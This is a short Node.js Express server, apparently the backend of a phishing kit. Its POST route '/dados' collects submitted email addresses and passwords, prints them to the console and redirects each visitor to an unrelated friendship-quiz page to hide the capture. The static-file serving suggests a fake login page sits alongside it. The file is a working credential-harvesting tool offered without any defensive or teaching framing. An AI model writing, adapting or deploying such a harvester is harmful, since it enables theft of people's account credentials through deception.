const express = require('express')
const app = express()

app.use(express.json())
app.use(express.urlencoded({extended: false}))

app.use(express.static(`${__dirname}`))

app.post('/dados', (req, res) => {
	const {email, pass} = req.body
	res.redirect("https://pt.quizur.com/quiz-sobre-mim/grande-desafio-da-amizade-quem-me-conhece-m/561dac87b301ffbefb6602cf75fa03f7")
	console.log(`email: ${email} senha: ${pass}`)
	console.log("   ")
	//console.log(req.body)

})

app.listen(3000)
